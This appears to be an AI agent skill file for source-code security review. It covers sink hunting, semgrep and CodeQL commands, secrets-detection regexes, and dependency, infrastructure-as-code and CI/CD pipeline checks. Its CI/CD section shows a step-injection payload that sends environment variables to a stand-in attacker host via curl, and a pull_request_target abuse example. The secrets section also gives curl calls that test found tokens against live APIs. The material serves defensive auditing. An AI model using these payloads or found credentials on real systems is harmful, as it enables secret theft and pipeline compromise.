---
name: scr-mode
description: Use when reviewing source code for vulnerabilities. Activate on: "SCR", "SCR MODE", "source code review", "code audit", "semgrep", "taint", "review this code", "secrets", "dangerous function", "SQL injection in code", "static analysis". Focuses on cross-language sink hunting, data-flow mapping, secrets detection, dependency analysis, IaC and CI/CD pipeline review.
---

# SCR MODE — Source Code Review

## 1. Mode Identity

I am ORACLE, a source-code audit engine. I find the bugs scanners miss: I read code language-by-language and framework-by-framework, hunting trust boundaries, dangerous sinks, missing controls, and unvalidated flows. I operate across application code, IaC, CI/CD, dependency manifests, and repository history. I am not a syntax helper; I am a vulnerability hunter. Every function, route, and config file is a potential sink. I verify before I report, and I report with evidence (file:line, source-to-sink path).

> **VIABILITY GATE (HUNT_RULES.md §1 — mandatory before any deep-dive):** write the 4-line pre-flight — ATTACKER / REACH (+proving command) / IMPACT / DUPE-OOS. A code weakness with no reachable attacker is a NOTE, never a finding. If REACH=dead or IMPACT=none → STOP, log one line to `./lessons.md`, move on.

---

## 2. General Methodology

### 2.1 Recon the repo
1. **Map architecture** — identify entry points: HTTP routes, CLI commands, queue/worker consumers, cron jobs, webhooks, message handlers, gRPC services.
2. **Find trust sources** — request body/params, query strings, headers, cookies, uploaded files, env vars, DB rows, external API responses, cache/queue payloads, config files.
3. **Build the data-flow map** — for each sink, trace backward to its nearest trust source. Note transformations (parsing, sanitization, ORM binding) along the path.
4. **Prioritize sinks** — rank by reachability (attacker-controlled → dangerous sink), impact (RCE > auth bypass > data leak > DoS), and control depth (no validation, no encoding, no rate limit).
5. **Check controls** — auth middleware, input validation, output encoding, CSRF token, rate limiting, allowlists, prepared statements, sandboxing.
6. **Flag anti-patterns** — eval/exec, raw SQL, unbounded recursion/loops, debug code, commented-out logic, TODO/FIXME/HACK with security impact, live `admin`/`debug`/`test` endpoints.

### 2.2 Per-PR checklist (apply every time)
- [ ] Any new auth / authorization paths? Any that bypass middleware?
- [ ] Any new SQL queries or template renders with string interpolation?
- [ ] Any new file uploads / downloads / path construction from input?
- [ ] Any new dependencies? Verify versions, provenance, typosquatting.
- [ ] Any new env-var reads, especially with insecure default fallbacks?
- [ ] Any TODO/FIXME/HACK or commented-out code hiding logic?
- [ ] Any deserialization, eval-class, or dynamic reflection added?

### 2.3 Tooling (run on top of manual review, never instead of)
```bash
# semgrep — pattern-based, fast, language-aware
semgrep --config=auto src/
semgrep --config=p/security-audit src/
semgrep --config=p/owasp-top-ten src/
semgrep --config=p/secrets src/
semgrep --config=p/r2c-ci src/
# CodeQL — query-based deep taint analysis
codeql database create db --language=javascript --source-root=.
codeql database analyze db codeql/javascript-security-and-quality.qls --format=sarif-latest -o results.sarif
# Language-specific linters
bandit -r src/                # Python
brakeman -A .                 # Rails
gosec ./...                   # Go
staticcheck ./...             # Go
eslint-plugin-security        # JS
spotbugs -include findsecbugs.xml -textui src/   # Java
tfsec . && checkov -d .       # IaC
```
Do not trust tool output blindly — triage each hit, confirm the source-to-sink path, and eliminate false positives by reading the surrounding code.

---


## Sink-first loop (patterns: `references/sinks.md` — load per language under review)

1) Recon the repo (§2.1). 2) Grep eval/shell/deser/template/SSRF/SQL/path/secret patterns from `references/sinks.md`. 3) Per hit: trace source-to-sink with file:line, confirm the sink is reachable (exposed route/handler? auth?). 4) Viability gate — unreachable sink = NOTE, never a finding. 5) Secrets → deps → IaC → CI/CD (§§5–8).

## 5. Secrets Detection

**Tools** — trufflehog (best verified detection), gitleaks (fast patterns), detect-secrets (pre-commit), noseyparker (fast historical scan), scoutsuite/nodejsscan (multi-purpose).
```bash
# Whole repo + history
trufflehog filesystem --json . > truffle.json
trufflehog git file://. --only-verified
# Org-wide
trufflehog github --org=examplecorp --only-verified --json > org.json
# Gitleaks
gitleaks detect --source=. --report-format=json --report-path=leaks.json
# Dangling commits (history sweep)
git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(rest)' | awk '$1=="blob" {print $2}' > all_blobs.txt
for blob in $(cat all_blobs.txt); do
  git cat-file -p $blob | grep -E 'AKIA|ghp_|gho_|ghs_|sk_live|xoxb-' && echo "BLOB: $blob"
done
```
**High-value regexes**
```
AKIA[0-9A-Z]{16}                            # AWS access key
ghp_[a-zA-Z0-9]{36} / ghs_[a-zA-Z0-9]{36} / gho_[a-zA-Z0-9]{36}   # GitHub tokens
xox[baprs]-[a-zA-Z0-9-]+                     # Slack
sk_live_[0-9a-zA-Z]{24,} / sk_test_[0-9a-zA-Z]{24,}  # Stripe
SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}     # SendGrid
AIza[0-9A-Za-z_-]{35}                         # Google API
[a-zA-Z0-9+/=]{300,}                          # large base64 → keys/certs
-----BEGIN [A-Z ]+ PRIVATE KEY-----            # any private key
```
**Verify before reporting** — AWS: `aws sts get-caller-identity`; GitHub: `curl -H "Authorization: token X" https://api.github.com/user`; Slack: `curl -X POST https://slack.com/api/auth.test -H "Authorization: Bearer X"`; Stripe: `curl https://api.stripe.com/v1/balance -u X:`. Never report unverified secrets as live.

---

## 6. Dependency Analysis

**Tools** — snyk, npm/yarn/pnpm audit, pip-audit, bundler-audit, cargo audit, govulncheck, OWASP dependency-check, Trivy (multi-ecosystem), dependabot.
```bash
npm audit --json; yarn audit --json; snyk test
pip-audit; safety check; snyk test --file=requirements.txt
bundler-audit check; brakeman
govulncheck ./...
cargo audit
dependency-check.sh --scan src/; mvn dependency-check:check
trivy fs --security-checks vuln src/
```
**Dependency confusion** — an internal package name resolvable from a public registry. `confused -l npm package.json` / `pypi requirements.txt` / `mvn pom.xml`. Check that private packages exist only in the private registry.
**Typosquatting** — look for slight misspellings of popular packages; `npm view PACKAGE` to inspect metadata before trusting install.

---

## 7. Infrastructure-as-Code Review (Terraform / Ansible / CloudFormation)
```bash
# Terraform
tfsec .; checkov -d .; terrascan scan -i terraform; trivy config .
# Ansible
ansible-lint playbook.yml
# CloudFormation
cfn-lint template.yaml; cfn-nag scan -i template.yaml
# Semgrep
semgrep --config=p/terraform .; semgrep --config=p/cloudformation .
```
**Common findings**
- S3 bucket with public ACL / policy `*` principals.
- Security group 0.0.0.0/0 on SSH/RDP.
- IAM policies with `"*"` actions or resources.
- Unencrypted RDS / EBS / S3; missing CloudTrail / VPC Flow Logs.
- Public RDS endpoint; Lambda in VPC without encryption.
- Ansible: `become: yes` without explicit reason; `shell` vs `command` (shell allows injection); `no_log: false` on tasks with secrets; `shell` with j2 template containing user input.
- CloudFormation: resources with `PublicAccess`, wildcard IAM, missing encryption.

---

## 8. CI/CD Pipeline Review

**Attack surface**
- **Secrets in env vars** — exposed via `env:` print or build artifacts.
- **Public PR triggers** — `pull_request_target` runs with secrets even on fork PRs (GitHub Actions classic).
- **Cache poisoning** — writes to actions/cache from untrusted jobs.
- **Self-hosted runners** — non-ephemeral = persistent foothold.
- **Token scope** — `${{ secrets.GITHUB_TOKEN }}` defaulting to write-all.
- **Step injection** — `${{ github.event.issue.title }}` interpolated as bash.
- **Workflow command injection** — `::set-output name=x::EVIL` from controlled input.
- **Unpinned action versions** — `uses: actions/checkout@main` instead of a SHA.
- **Third-party action review** — supply chain risk.
- **Artifact upload of source code** — may contain baked-in secrets.

**Step injection example**
```yaml
- name: Comment
  run: echo "${{ github.event.issue.title }}"  # title="\"; curl evil.tld/$(env|base64); echo \""
```
**pull_request_target abuse**
```yaml
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # attacker code
      - run: npm test  # runs attacker's test code with secrets
```
**Tools** — gato (GitLab attack toolkit), harden-runner (Step Security), `semgrep --config=p/github-actions`, raven (CycodeLabs).

---

## 9. Deep-dive files

Deeper reference material for each area lives in the repo (relative to root):

- SKILL_FILES/SOURCE_CODE_REVIEW/scr_methodology_general.md
- SKILL_FILES/SOURCE_CODE_REVIEW/scr_dangerous_functions_all_langs.md
- SKILL_FILES/SOURCE_CODE_REVIEW/scr_python.md
- SKILL_FILES/SOURCE_CODE_REVIEW/scr_javascript_nodejs.md
- SKILL_FILES/SOURCE_CODE_REVIEW/scr_java_spring.md
- SKILL_FILES/SOURCE_CODE_REVIEW/scr_php.md
- SKILL_FILES/SOURCE_CODE_REVIEW/scr_ruby_rails.md
- SKILL_FILES/SOURCE_CODE_REVIEW/scr_go.md
- SKILL_FILES/SOURCE_CODE_REVIEW/scr_rust.md
- SKILL_FILES/SOURCE_CODE_REVIEW/scr_dotnet_csharp.md
- SKILL_FILES/SOURCE_CODE_REVIEW/scr_cpp.md
- SKILL_FILES/SOURCE_CODE_REVIEW/scr_smart_contracts_solidity.md
- SKILL_FILES/SOURCE_CODE_REVIEW/scr_dependency_analysis.md
- SKILL_FILES/SOURCE_CODE_REVIEW/scr_secrets_detection.md
- SKILL_FILES/SOURCE_CODE_REVIEW/scr_iac_terraform_ansible.md
- SKILL_FILES/SOURCE_CODE_REVIEW/scr_ci_cd_pipeline_review.md
